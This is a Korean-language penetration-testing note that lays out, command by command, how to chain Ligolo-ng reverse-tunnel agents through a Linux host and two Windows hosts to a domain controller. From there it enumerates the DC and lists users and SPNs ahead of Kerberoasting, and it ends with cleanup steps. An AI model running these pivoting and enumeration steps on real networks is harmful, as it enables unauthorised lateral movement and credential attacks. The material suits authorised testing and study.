---
tags:
  - 환경/linux
  - 환경/windows
  - 환경/ad
  - 기능/피벗
시작상태:
  - Linux 피벗 셸과 두 Windows 중간 세션 확보
  - DC가 마지막 Windows 호스트에서만 연결됨
목표:
  - Linux 공격 호스트에서 최종 내부망 접근
  - DC의 Kerberos LDAP SMB 서비스 열거
필요권한:
  - Linux 피벗 호스트 명령 실행 권한
  - 두 Windows 중간 호스트 명령 실행 세션
필요정보:
  - 각 홉에서 다음 홉으로 연결 가능한 IP와 포트
  - 마지막 Windows 호스트에서 보이는 내부망 CIDR과 DC IP
네트워크위치:
  - Linux 공격 호스트에서 Linux 피벗과 두 Windows 호스트를 거쳐 DC에 도달
---

# 3홉 피벗팅으로 DC 열거

## 시나리오 개요

`Linux 공격 호스트 -> Linux 피벗 -> Windows1 -> Windows2 -> DC` 구조에서 DC가 Windows2에서만 보일 때 각 홉의 도달성을 확인하고 Ligolo-ng 세션을 연쇄 연결하여 공격 호스트의 AD 도구가 DC에 직접 연결되게 만든다.

## 기준 구조

```text
Linux 공격 호스트
  -> Linux 피벗
    -> Windows1
      -> Windows2
        -> DC 또는 최종 내부망
```

| DC 연결 성공 위치 | 필요한 경로 | 선택 |
|---|---|---|
| Linux 피벗 | 1홉 | 기존 터널 또는 [[SSH 포트 포워딩 피벗팅]] |
| Windows1 | 2홉 | [[ligolo-ng]] 또는 [[Chisel SOCKS 터널링]] |
| Windows2 | 3홉 | Ligolo-ng listener 연쇄 연결 우선 |
| 어느 호스트에서도 실패 | 피벗 이전 문제 | DC IP·route·방화벽·서비스 상태 재확인 |

## 시작 상태

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| Linux 공격 호스트에서 Linux 피벗 연결 | agent가 proxy 포트에 연결 가능 | `nc -vz <ATTACK_IP> 11601` | listener 주소와 방화벽 확인 |
| Windows1에서 Linux 피벗 연결 | relay 포트 접근 가능 | `Test-NetConnection <LINUX_PIVOT_IP> -Port 4444` | Windows1 route와 Linux listener 확인 |
| Windows2에서 Windows1 연결 | relay 포트 접근 가능 | `Test-NetConnection <WINDOWS1_IP> -Port 4445` | Windows2 route와 Windows1 listener 확인 |
| Windows2에서 DC 연결 | 88·389·445 중 필요한 서비스 연결 | `Test-NetConnection <DC_IP> -Port 445` | DC 주소와 Windows2 route 확인 |

## 작업 전 변경 기준

`<THIS_TUN>`과 `<LIGOLO_WORKDIR>`는 이번 실행에만 사용할 고유한 이름과 절대 경로로 정한다. 실제 PID·세션 ID·listener ID·호스트 주소와 자격 증명은 현재 작업 기록에만 남기고 Vault에는 저장하지 않는다.

| 입력 묶음 | 역할·형식·출처 | 가상 예시 |
|---|---|---|
| `<ATTACK_IP>`, `<LINUX_PIVOT_IP>`, `<WINDOWS1_IP>`, `<DC_IP>` | 각 홉에서 다음 홉으로 도달하는 IPv4 주소이며, 해당 호스트의 `ipconfig`·`ip route`·세션 출력에서 얻는다. | `192.0.2.10`, `192.0.2.20`, `192.0.2.30`, `192.0.2.53` |
| `<WINDOWS2_DEEP_CIDR>`, `<THIS_TUN>` | Windows2에서 보인 최종 내부 CIDR과 공격 호스트에 새로 만들 TUN 이름이다. | `198.51.100.0/24`, `ligolo-p03` |
| `*_AGENT_PATH`, `<LIGOLO_PROXY_PATH>`, `<LIGOLO_WORKDIR>` | 각 실행 호스트의 절대 실행 파일 경로와 공격 호스트의 새 작업 디렉터리다. | `C:\\Tools\\agent.exe`, `/opt/ligolo/proxy`, `/tmp/ligolo-p03` |
| `*_PID`, `*_AGENT_ID`, `*_LISTENER_ID` | 해당 단계의 `ps`·`Get-CimInstance`·`tunnel_list`·`listener_list` 출력에서 기록한 식별자다. | `1234`, `2`, `1` |

Linux 공격 호스트에서 기존 interface·route·listener·프로세스와 작업 디렉터리를 확인한다.

```bash
'<LIGOLO_PROXY_PATH>' -version
ip -br link show
ip route show '<WINDOWS2_DEEP_CIDR>'
ss -ltnp 'sport = :11601'
ps -eo pid=,lstart=,args= | grep '[l]igolo'
test -e '<LIGOLO_WORKDIR>' && find '<LIGOLO_WORKDIR>' -maxdepth 2 -printf '%P\n'
```

- `<THIS_TUN>`이나 `<LIGOLO_WORKDIR>`가 이미 있으면 재사용하거나 삭제하지 말고 다른 고유 값을 선택한다. 같은 CIDR route가 이미 있으면 덮어쓰지 않고 기존 route의 device·gateway·metric을 기록한 뒤 충돌하지 않는 설계를 선택한다.
- Ligolo-ng v0.8 이상은 기본 실행 위치의 `ligolo-ng.yaml`, `ligolo-ng.history`, `ligolo-selfcerts`를 만들거나 갱신할 수 있고 interface·route를 설정 파일에 기록한다. 고유한 `<LIGOLO_WORKDIR>`에서 proxy를 실행해 기존 설정과 분리한다.
- Linux 피벗, Windows1, Windows2의 agent 실행 파일은 이 시나리오가 업로드하지 않는다. 작업 전에 존재한 파일은 복구 대상으로 보지 않으며, 별도 전송 단계에서 새 경로로 반입한 경우에만 그 경로를 따로 기록한다.

## 공격 경로 요약

| 단계 | 실행 위치 | 수행할 행동 | 확인할 출력·상태 | 다음 단계 |
|---|---|---|---|---|
| 1 | 각 피벗 호스트 | DC 포트 도달성 비교 | DC에 연결되는 가장 앞선 위치 | 필요한 홉 수 확정 |
| 2 | Linux 공격 호스트와 Linux 피벗 | Ligolo proxy·첫 agent 연결 | Linux agent 세션 | Windows1용 listener 생성 |
| 3 | Windows1 | 두 번째 agent 연결 | Windows1 agent 세션 | Windows2용 listener 생성 |
| 4 | Windows2 | 세 번째 agent 연결 | Windows2 agent 세션 | 최종 CIDR route 추가 |
| 5 | Linux 공격 호스트 | DC TCP 연결과 서비스 열거 | 88·389·445 응답과 도메인 단서 | 인증 후 AD 열거 |

## 1. 각 홉에서 DC 도달성 비교

Linux 피벗에서 DC의 핵심 TCP 포트를 확인한다.

`<DC_IP>`는 Windows2에서 확인한 최종 DC의 IPv4 주소(예: `192.0.2.53`)이며, 이 Linux 명령은 Linux 피벗 호스트에서 실행한다. 바로 아래 Windows 명령도 같은 `<DC_IP>`를 사용한다.

```bash
ip -br addr
ip route
nc -zvw1 <DC_IP> 88
nc -zvw1 <DC_IP> 389
nc -zvw1 <DC_IP> 445
```

Windows1과 Windows2에서 같은 대상·포트를 비교한다.

```powershell
ipconfig /all
route print -4
Test-NetConnection <DC_IP> -Port 88
Test-NetConnection <DC_IP> -Port 389
Test-NetConnection <DC_IP> -Port 445
```

Windows2에서만 `TcpTestSucceeded : True`가 나오면 3홉 경로가 필요하다. 어느 홉에서도 연결되지 않으면 터널을 만들기 전에 DC IP와 최종 내부망 route를 다시 확인한다.

## 2. 공격 호스트와 Linux 피벗 연결

Linux 공격 호스트에서 Ligolo-ng proxy용 TUN 인터페이스를 만들고 proxy를 실행한다.

`<THIS_TUN>`은 작업 전 존재하지 않는 공격 호스트 TUN 이름, `<LIGOLO_WORKDIR>`은 같은 호스트의 새 절대 작업 디렉터리, `<LIGOLO_PROXY_PATH>`는 설치된 proxy의 절대 실행 경로다. 예시는 각각 `ligolo-p03`, `/tmp/ligolo-p03`, `/opt/ligolo/proxy`다.

```bash
sudo ip tuntap add user "$(whoami)" mode tun '<THIS_TUN>'
sudo ip link set '<THIS_TUN>' up
test ! -e '<LIGOLO_WORKDIR>'
mkdir -m 700 -- '<LIGOLO_WORKDIR>'
cd -- '<LIGOLO_WORKDIR>'
'<LIGOLO_PROXY_PATH>' -selfcert
```

다른 공격 호스트 셸에서 `ss -ltnp 'sport = :11601'`과 `ps`로 방금 시작한 proxy의 PID·실행 경로·시작 시각을 `<LIGOLO_PROXY_PID>`로 기록한다. v0.8 이상이면 `<LIGOLO_WORKDIR>` 안에서 새로 생성된 설정·history·selfcert cache 경로도 기록한다.

Linux 피벗에서 첫 agent를 연결한다.

`<LINUX_AGENT_PATH>`는 Linux 피벗에 이미 있는 agent 절대 경로이고, `<ATTACK_IP>`는 proxy listener를 실행한 공격 호스트 IPv4 주소(예: `192.0.2.10`)다. 아래 PID는 이 명령행을 포함한 `ps` 출력의 PID 필드에서 기록한다.

```bash
'<LINUX_AGENT_PATH>' -connect <ATTACK_IP>:11601 -ignore-cert
```

별도 Linux 피벗 셸에서 정확한 실행 경로와 연결 주소를 가진 PID를 `<LINUX_AGENT_PID>`로 기록하고 `4444/TCP`가 비어 있는지 확인한다.

```bash
ps -eo pid=,lstart=,args= | grep '[a]gent.*<ATTACK_IP>:11601'
ss -ltnp 'sport = :4444'
```

proxy 콘솔에서 Linux 피벗 세션을 선택하고 Windows1이 연결할 listener를 만든다.

```text
session
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601 --tcp
listener_list
```

확인할 출력:

- proxy 콘솔에 Linux agent가 새 세션으로 표시됨.
- `listener_list`에 `0.0.0.0:4444`가 표시됨. 생성 출력과 행의 agent·주소·redirect를 대조해 ID를 `<LINUX_LISTENER_ID>`로 기록함.
- Windows1에서 `<LINUX_PIVOT_IP>:4444` 연결이 성공함.

## 3. Windows1과 Windows2 agent 연쇄 연결

Windows1에서 Linux 피벗 listener로 agent를 연결한다.

`<WINDOWS1_AGENT_PATH>`는 Windows1의 agent 절대 경로(예: `C:\\Tools\\ligolo-agent.exe`)이며, `<LINUX_PIVOT_IP>`는 바로 앞 listener를 가진 Linux 피벗 IPv4 주소다. `<WINDOWS1_AGENT_PID>`는 아래 `ProcessId` 출력 필드에서 기록한다.

```powershell
& '<WINDOWS1_AGENT_PATH>' -connect <LINUX_PIVOT_IP>:4444 -ignore-cert
```

별도 Windows1 PowerShell에서 실행 경로와 연결 주소가 일치하는 PID를 `<WINDOWS1_AGENT_PID>`로 기록하고 `4445/TCP`의 기존 listener를 확인한다.

```powershell
Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq '<WINDOWS1_AGENT_PATH>' -and $_.CommandLine -like '*<LINUX_PIVOT_IP>:4444*' } | Select-Object ProcessId, ExecutablePath, CommandLine
Get-NetTCPConnection -State Listen -LocalPort 4445 -ErrorAction SilentlyContinue
```

proxy 콘솔에서 새 Windows1 세션을 선택하고 Windows2가 연결할 listener를 만든다.

```text
session
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:11601 --tcp
listener_list
```

생성 출력과 `listener_list`의 Windows1·`0.0.0.0:4445`·`127.0.0.1:11601` 행을 대조해 `<WINDOWS1_LISTENER_ID>`를 기록한다.

Windows2에서 Windows1 listener로 agent를 연결한다.

`<WINDOWS2_AGENT_PATH>`는 Windows2의 agent 절대 경로이고, `<WINDOWS1_IP>`는 Windows1 listener IPv4 주소다. `<WINDOWS2_AGENT_PID>`는 아래 `ProcessId` 출력 필드에서 기록한다.

```powershell
& '<WINDOWS2_AGENT_PATH>' -connect <WINDOWS1_IP>:4445 -ignore-cert
```

별도 Windows2 PowerShell에서 실행 경로와 연결 주소가 일치하는 PID를 `<WINDOWS2_AGENT_PID>`로 기록한다.

```powershell
Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq '<WINDOWS2_AGENT_PATH>' -and $_.CommandLine -like '*<WINDOWS1_IP>:4445*' } | Select-Object ProcessId, ExecutablePath, CommandLine
```

Proxy 콘솔의 `tunnel_list`에 Linux 피벗, Windows1, Windows2 세션이 각각 보여야 한다. 각 agent 이름·연결 주소와 ID를 대조해 `<LINUX_AGENT_ID>`, `<WINDOWS1_AGENT_ID>`, `<WINDOWS2_AGENT_ID>`를 기록한다. 세션이 나타나지 않으면 이전 홉에서 listener가 열린 상태와 다음 홉에서 해당 주소·포트로 연결되는지를 먼저 확인한다. 하위 agent가 상위 agent listener와 전송 연결에 의존하고 복구 때 반대 순서가 필요한 이유는 [[피벗과 터널의 연결 경계]]를 따른다.

## 4. Windows2의 최종 내부망 route 연결

proxy 콘솔에서 Windows2 세션을 선택하고 최종 내부망 CIDR을 Ligolo 인터페이스에 연결한다.

`<THIS_TUN>`은 2단계에서 만든 같은 공격 호스트 interface이고, `<WINDOWS2_DEEP_CIDR>`은 Windows2 route 출력에서 얻은 CIDR(예: `198.51.100.0/24`)이다. 선택한 session은 `tunnel_list`에서 Windows2 agent 경로와 연결 주소가 일치한 행이다.

```text
session
interface_add_route --name <THIS_TUN> --route <WINDOWS2_DEEP_CIDR>
tunnel_start --tun <THIS_TUN>
```

`interface_add_route`는 Ligolo-ng v0.6 이상에서 제공된다. 사용 중인 버전에서 이 명령을 지원하지 않으면 Linux 공격 호스트에 route를 추가한다. 관리형 명령과 수동 명령을 둘 다 실행하지 않는다.

```bash
sudo ip route add <WINDOWS2_DEEP_CIDR> dev '<THIS_TUN>'
ip route get <DC_IP>
```

`ip route get <DC_IP>`가 `dev <THIS_TUN>`을 가리키는지 확인한다. 기존에 같은 CIDR route가 있으면 덮어쓰지 말고 기존 경로와 metric을 먼저 기록한다.

## 5. 공격 호스트에서 DC 연결과 서비스 열거

Linux 공격 호스트에서 넓은 스캔 전에 단일 TCP 연결을 확인한다.

```bash
nc -vz <DC_IP> 88
nc -vz <DC_IP> 389
nc -vz <DC_IP> 445
```

연결이 되면 TCP connect scan과 서비스별 기본 열거를 진행한다.

```bash
nmap --unprivileged -sT -Pn -n <DC_IP> -p53,88,135,389,445,5985,3389 --open
nxc smb <DC_IP>
ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts defaultNamingContext dnsHostName
```

도메인명과 유효 계정이 있으면 인증 후 사용자와 SPN을 확인한다.

```bash
nxc ldap <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --users
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

| 출력 | 새로 확인한 상태 | 다음 행동 |
|---|---|---|
| 88·389·445 TCP 연결 성공 | 공격 호스트에서 DC 서비스에 직접 연결 가능 | 서비스별 열거 계속 |
| RootDSE의 `defaultNamingContext` | 도메인 DN 확인 | [[AD 도메인 컨텍스트 기본 확인]] |
| SMB 호스트명·도메인명 | DC 이름과 도메인 후보 확인 | LDAP·Kerberos 이름 해석 정리 |
| LDAP 인증 성공과 사용자 목록 | 유효 AD 계정과 읽기 권한 확인 | [[인증 후 AD 사용자와 컴퓨터 객체 열거]] |
| SPN 계정 확인 | Kerberoasting 전제 충족 | [[Kerberoasting]] |

## 6. 대안 경로 선택

Ligolo-ng를 사용할 수 없고 끝단에서 SOCKS만 열면 되는 경우 [[Chisel SOCKS 터널링]]을 검토한다. Windows 중간 호스트가 다음 relay를 받아야 하면 [[Windows Netsh Portproxy 포트 포워딩]] 또는 [[socat]]으로 listener를 이어야 하므로 각 홉의 포트와 복구 절차를 별도로 기록한다.

끝단 Windows2에 Meterpreter 세션이 있으면 [[Meterpreter 라우팅과 포트 포워딩]]으로 route와 SOCKS를 구성할 수 있다.

```text
sessions -l
use post/multi/manage/autoroute
set SESSION <SESSION_ID>
set SUBNET <WINDOWS2_DEEP_CIDR>
run
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 9050
set VERSION 4a
run -j
```

```bash
proxychains -q nc -vz <DC_IP> 445
proxychains -q nmap -sT -Pn -n <DC_IP> -p88,389,445
```

## 실패 시 분기

| 멈춘 단계·출력 | 가능한 원인 | 확인 명령 | 이어갈 단계 |
|---|---|---|---|
| 다음 agent가 연결되지 않음 | 이전 agent listener 주소·포트에 연결 불가 | `Test-NetConnection <LISTENER_IP> -Port <PORT>` | listener bind 주소와 route 확인 |
| listener는 있지만 proxy에 세션이 없음 | `--to` 포트 또는 proxy listener 불일치 | `listener_list` | proxy 포트와 listener 전달 대상 비교 |
| route 추가 후 DC 연결 실패 | 잘못된 CIDR, 잘못 선택한 세션, 기존 route 충돌 | `ip route get <DC_IP>`, Windows2의 `route print -4` | 최종 CIDR과 Windows2 도달성 재확인 |
| `nc`는 성공하지만 `nmap`만 실패 | SYN scan·권한·timeout 문제 | `nmap --unprivileged -sT -Pn -n ...` | TCP connect scan 사용 |
| IP는 연결되지만 FQDN이 해석되지 않음 | 내부 DNS 경로 미설정 | `nslookup <DC_FQDN> <DC_IP>` | 도구에 DC IP·FQDN을 함께 지정 |
| Kerberos 요청 실패 | DNS, FQDN, realm 또는 시간 차이 | `date`, `nslookup`, 도메인명 확인 | 이름 해석과 시간 동기화 후 재시도 |

## 변경 영향과 복구

### 실행 단계별 변경 항목

| 실행 단계 | 생성·변경 항목 | 작업 전 확인 | 이번 작업 식별값 |
|---|---|---|---|
| 공격 호스트 proxy 시작 | proxy 프로세스, `11601/TCP`, v0.8+의 설정·history·selfcert cache | 기존 listener·proxy process와 `<LIGOLO_WORKDIR>` 존재 여부 | `<LIGOLO_PROXY_PID>`, 고유 작업 디렉터리와 그 안의 생성 항목 |
| Linux 피벗 agent 시작 | Linux agent 프로세스 | 동일 실행 경로·연결 주소의 기존 process | `<LINUX_AGENT_PID>`, `<LINUX_AGENT_ID>` |
| Linux 피벗 listener 추가 | Linux 피벗의 `4444/TCP` listener | 피벗의 기존 `4444/TCP` listener와 `listener_list` | `<LINUX_LISTENER_ID>`와 Linux agent·주소·redirect 조합 |
| Windows1 agent·listener 추가 | Windows1 agent 프로세스와 `4445/TCP` listener | 실행 경로의 기존 process와 Windows1의 기존 `4445/TCP` listener | `<WINDOWS1_AGENT_PID>`, `<WINDOWS1_AGENT_ID>`, `<WINDOWS1_LISTENER_ID>` |
| Windows2 agent 시작 | Windows2 agent 프로세스와 최종 tunnel session | 실행 경로의 기존 process | `<WINDOWS2_AGENT_PID>`, `<WINDOWS2_AGENT_ID>` |
| 최종 route·tunnel 시작 | `<THIS_TUN>`과 `<WINDOWS2_DEEP_CIDR>` route | 같은 이름의 interface와 기존 CIDR route | 고유 interface 이름, route, Windows2 agent ID |

이 주 경로는 Windows 방화벽이나 portproxy를 변경하지 않고 agent 파일도 업로드하지 않는다. 대안 경로를 실제로 실행했을 때만 그 경로가 만든 Metasploit job·route 또는 portproxy rule을 아래 별도 절차로 정리한다.

### 버전별 관리 명령 확인

- Ligolo-ng v0.6 이상은 관리형 interface·route 명령을 제공한다. 현재 공식 소스의 route 제거 명령은 `route_del --name <THIS_TUN> --route <WINDOWS2_DEEP_CIDR>`, tunnel 종료는 `tunnel_stop --agent <WINDOWS2_AGENT_ID>`이다.
- 현재 공식 소스의 `listener_stop`은 인자 없이 실행한 뒤 목록에서 행을 선택한다. 이전 공식 문서처럼 `listener_stop <LISTENER_ID>`를 받는 버전도 있으므로, 정리 전에 proxy의 `help listener_stop`, `help tunnel_stop`, `help route_del`을 확인한다. 어느 형식이든 ID만 믿지 말고 `listener_list`의 agent·listen 주소·redirect가 이번 기록과 모두 일치하는 항목만 선택한다.
- v0.8 이상에서는 interface·route 변경이 설정 파일에도 기록된다. 관리형 route를 사용했다면 Linux의 `ip route del`만으로 끝내지 않고 proxy의 `route_del`과 `interface_delete`로 설정 항목까지 제거한다.
- Ligolo-ng v0.8.0·v0.8.1에는 `interface_delete` 뒤 물리 interface가 남을 수 있었고 이 문제는 v0.8.2에서 수정됐다. 해당 버전과 그 이전·이후 모두 proxy 출력만으로 완료를 판단하지 말고 Linux 공격 호스트의 route와 interface를 직접 확인한다.

### 연결이 살아 있을 때 정리 순서

중간 listener부터 끊지 않는다. 먼저 Linux 피벗·Windows1·Windows2의 기존 제어 세션이 Ligolo 경로 밖에서도 유지되는지 확인하고, 가장 깊은 Windows2부터 정리한다.

1. Proxy 콘솔에서 Windows2 tunnel만 중지한다. 현재 문법을 지원하지 않는 이전 버전은 `session`으로 Windows2를 선택한 뒤 `stop`을 사용한다.

```text
tunnel_list
tunnel_stop --agent <WINDOWS2_AGENT_ID>
tunnel_list
```

`Closing tunnel` 출력 뒤 해당 agent가 `<THIS_TUN>`을 사용 중인 상태가 아니어야 한다. `no tunnel started`가 나오면 agent ID와 기존 연결 단절 여부를 먼저 확인하고, 전체 session을 일괄 종료하지 않는다.

2. Windows2의 기존 PowerShell 세션에서 기록한 PID가 같은 실행 경로·명령행인지 확인한 뒤 그 process만 종료한다.

```powershell
Get-CimInstance Win32_Process -Filter "ProcessId = <WINDOWS2_AGENT_PID>" | Select-Object ProcessId, ExecutablePath, CommandLine
Stop-Process -Id <WINDOWS2_AGENT_PID>
Get-Process -Id <WINDOWS2_AGENT_PID> -ErrorAction SilentlyContinue
```

마지막 명령에 process가 반환되지 않아야 한다. PID의 실행 경로·명령행이 다르면 PID가 재사용된 것이므로 종료하지 않고 세션 ID와 연결 주소로 다시 식별한다.

3. Windows1 agent가 살아 있는 동안 Windows1의 `4445/TCP` listener만 중지한다.

```text
listener_list
listener_stop
listener_list
```

현재 버전의 선택 목록에서 `<WINDOWS1_LISTENER_ID>`에 해당하며 Windows1·`0.0.0.0:4445`·`127.0.0.1:11601`이 모두 일치하는 행을 선택한다. 이전 버전의 help가 위치 인자를 요구할 때만 `listener_stop <WINDOWS1_LISTENER_ID>`를 사용한다. Windows1에서도 listener가 사라졌는지 확인한다.

```powershell
Get-NetTCPConnection -State Listen -LocalPort 4445 -ErrorAction SilentlyContinue
```

4. Windows1의 기록된 agent PID를 확인하고 종료한다.

```powershell
Get-CimInstance Win32_Process -Filter "ProcessId = <WINDOWS1_AGENT_PID>" | Select-Object ProcessId, ExecutablePath, CommandLine
Stop-Process -Id <WINDOWS1_AGENT_PID>
Get-Process -Id <WINDOWS1_AGENT_PID> -ErrorAction SilentlyContinue
```

5. Linux 피벗 agent가 살아 있는 동안 같은 방식으로 `4444/TCP` listener 행만 중지하고 피벗 호스트에서도 확인한다.

```text
listener_list
listener_stop
listener_list
```

```bash
ss -ltnp 'sport = :4444'
```

선택 행은 `<LINUX_LISTENER_ID>`뿐 아니라 Linux agent·`0.0.0.0:4444`·`127.0.0.1:11601`이 모두 일치해야 한다. `ss`에 다른 process가 남으면 종료하지 않고 PID·명령행을 대조한다.

6. Linux 피벗에서 기록한 agent PID의 명령행을 확인한 뒤 그 process만 종료한다.

```bash
ps -p <LINUX_AGENT_PID> -o pid=,lstart=,args=
kill -TERM <LINUX_AGENT_PID>
ps -p <LINUX_AGENT_PID> -o pid=,args=
```

7. 관리형 route를 사용한 v0.6+ 경로에서는 proxy 콘솔에서 이번 route와 interface 설정만 제거한다.

```text
interface_list
route_del --name <THIS_TUN> --route <WINDOWS2_DEEP_CIDR>
interface_delete --name <THIS_TUN>
interface_list
```

`interface_delete`가 설정과 route 제거 여부를 묻는 버전에서는 `<THIS_TUN>`이 이번 작업의 고유 interface임을 다시 확인한 뒤 해당 항목을 선택한다. 이어 Linux 공격 호스트에서 실제 route와 interface도 확인한다.

```bash
ip route show '<WINDOWS2_DEEP_CIDR>' dev '<THIS_TUN>'
ip link show '<THIS_TUN>'
```

관리 명령 뒤에도 이번 route나 interface가 남아 있으면, 특히 v0.8.0·v0.8.1인지 확인한 다음 아래 수동 경로의 정확한 항목 제거 명령을 사용한다. 수동 route를 사용한 이전 버전에서는 처음부터 proxy 제거 명령 대신 같은 수동 경로를 사용한다.

```bash
ip route show '<WINDOWS2_DEEP_CIDR>' dev '<THIS_TUN>'
sudo ip route del <WINDOWS2_DEEP_CIDR> dev '<THIS_TUN>'
sudo ip link delete '<THIS_TUN>'
ip route show '<WINDOWS2_DEEP_CIDR>' dev '<THIS_TUN>'
ip link show '<THIS_TUN>'
```

마지막 route 출력은 비어 있어야 하고 `ip link show`는 해당 device가 없다고 반환해야 한다. 기존의 다른 device·gateway를 사용하는 동일 CIDR route가 남아 있으면 이번 작업의 대상이 아니므로 보존한다.

8. Proxy 전용 터미널에서 `Ctrl-C`로 정상 종료한 뒤 공격 호스트에서 PID와 `11601/TCP`를 확인한다. 터미널을 잃은 경우에만 기록한 PID의 명령행을 대조하고 종료 신호를 보낸다.

```bash
ps -p <LIGOLO_PROXY_PID> -o pid=,lstart=,args=
kill -TERM <LIGOLO_PROXY_PID>
ps -p <LIGOLO_PROXY_PID> -o pid=,args=
ss -ltnp 'sport = :11601'
find '<LIGOLO_WORKDIR>' -maxdepth 3 -printf '%P\n'
rm -r -- '<LIGOLO_WORKDIR>'
test ! -e '<LIGOLO_WORKDIR>'
```

`kill -TERM`은 `Ctrl-C`로 이미 종료되어 PID가 없으면 실행하지 않는다. `<LIGOLO_WORKDIR>`은 작업 전에 없었고 현재 내용이 기록한 Ligolo 설정·history·selfcert cache뿐일 때만 정확한 절대 경로로 제거한다. 다른 파일이 있거나 경로가 다르면 삭제하지 말고 생성 경로를 다시 확인한다.

이 시나리오 밖에서 agent 실행 파일을 새 경로로 업로드했다면 각 agent PID가 사라진 뒤 해당 호스트에서 그 경로만 제거하고 `Test-Path` 또는 `test ! -e`로 확인한다. 작업 전부터 있던 `agent`, `proxy`, 설정 파일은 제거하지 않는다.

### 연결이 이미 끊어진 경우

- Proxy 콘솔에서 `tunnel_list`와 `listener_list`를 먼저 확인한다. offline 또는 목록에서 사라졌다는 사실만으로 원격 agent process와 파일 정리가 끝났다고 판단하지 않는다.
- 가장 깊은 호스트부터 독립 세션을 다시 확보해 기록한 PID·경로를 확인한다. 접근할 수 없는 호스트는 `원격 정리 미확인`으로 남긴다.
- 원격 확인과 별개로 공격 호스트의 이번 route·`<THIS_TUN>`·proxy PID·고유 작업 디렉터리는 위의 정확한 식별값으로 정리할 수 있다. 중간 호스트의 `4444/4445`가 남아 있는지는 각 호스트에서 직접 확인한다.

### 대안 경로를 실행한 경우

1홉을 이 시나리오에서 새 [[SSH 포트 포워딩 피벗팅]]으로 만들었다면 가장 깊은 호스트의 정리와 하위 Ligolo listener·agent·route 제거가 끝날 때까지 SSH master를 유지한다. 이후 해당 문서의 `<SSH_CONTROL_SOCKET>`으로 exact master를 종료하고 listener·작업용 host-key·ProxyChains 파일을 기준선과 대조한다. SSH가 먼저 끊겨 원격 `-R` listener나 하위 상태를 확인하지 못했으면 전체 복구 완료로 기록하지 않는다.

Meterpreter 대안을 실제 실행했다면 하위 호스트 정리를 마친 뒤 생성 시 기록한 SOCKS job과 route만 제거한다.

```text
msf6 > jobs -l
msf6 > jobs -k <SOCKS_JOB_ID>
msf6 > route print
msf6 > route remove <INTERNAL_SUBNET> <NETMASK> <SESSION_ID>
msf6 > route print
```

Windows portproxy 대안을 실행했다면 [[Windows Netsh Portproxy 포트 포워딩]]의 `show v4tov4`로 기존 값과 이번 listen 주소·포트를 구분하고 정확히 일치하는 rule 및 이번에 만든 방화벽 규칙만 제거한다.

## 완료 기준

### 공격 목표 판정

- Linux 공격 호스트의 `ip route get <DC_IP>`가 의도한 `<THIS_TUN>` 인터페이스를 가리킴.
- 공격 호스트에서 DC의 88·389·445 중 필요한 포트에 TCP 연결됨.
- SMB 또는 LDAP 출력으로 DC 호스트명·도메인명·도메인 DN을 확인함.
- 유효 AD 계정이 있으면 LDAP 사용자·SPN 열거가 실행됨.
- 피벗 경로 자체를 다시 선택해야 하면 [[내부망 경로 확보 후 피벗 구성]], DC 서비스가 보이면 관련 서비스·공격기법으로 이동함.

위 결과는 공격 목표 달성 판정이다. 터널·route·파일 정리가 끝났다는 뜻은 아니다.

### 최종 복구 상태 판정

| 판정 | 필요한 확인 | 최종 기록 |
|---|---|---|
| 복구 완료 | 가장 깊은 원격 host부터 task-created agent·listener·process·파일이 사라지고, 이어 각 hop과 공격 host의 exact route·TUN·proxy process·작업 디렉터리가 기준선으로 돌아왔음을 해당 host에서 확인 | `공격 목표: 달성/미달성`, `복구: 완료`를 별도로 기록 |
| 제한적 복구 | 접근 가능한 host와 공격 host의 exact 자원은 정리했지만 연결 단절 등으로 일부 원격 host의 agent·listener·파일 부재를 확인할 수 없음 | 확인한 host·자원과 `원격 정리 미확인` 대상을 식별값별로 기록하고 `복구 완료`로 표시하지 않음 |
| 복구 미완료 | 기록한 PID·listener ID·route·TUN·파일 중 하나라도 남아 있거나 원래 설정과 다른 값이 확인됨 | 남은 exact 자원, 마지막 확인 출력과 다시 접근해야 할 host를 기록 |

대안으로 SSH master, Meterpreter job·route 또는 Windows portproxy를 만들었다면 해당 하위 기법의 복구 확인까지 위 판정에 포함한다. 공격 목표가 실패했더라도 생성한 자원은 정리하며, 공격 목표가 성공했더라도 복구 상태가 제한적·미완료이면 두 결과를 합쳐 “완료”라고 쓰지 않는다.

## 관련 노트

- [[내부망 경로 확보 후 피벗 구성]]
- [[피벗팅 경로 식별과 내부망 열거]]
- [[ligolo-ng]]
- [[Chisel SOCKS 터널링]]
- [[proxychains]]
- [[socat]]
- [[Windows Netsh Portproxy 포트 포워딩]]
- [[Meterpreter 라우팅과 포트 포워딩]]
- [[SSH 포트 포워딩 피벗팅]]
- [[LDAP 서비스]]
- [[SMB 서비스]]
- [[Kerberos 서비스]]
- [[Kerberoasting]]

## 참고 링크

- [Ligolo-ng 공식 Quickstart](https://docs.ligolo.ng/Quickstart/)
- [Ligolo-ng 공식 listener 관리](https://docs.ligolo.ng/Listeners/)
- [Ligolo-ng v0.8+ 설정 파일](https://docs.ligolo.ng/Config-File/)
- [Ligolo-ng 공식 릴리스와 v0.8.2 정리 수정](https://github.com/nicocha30/ligolo-ng/releases)
- [Ligolo-ng 공식 저장소](https://github.com/nicocha30/ligolo-ng)
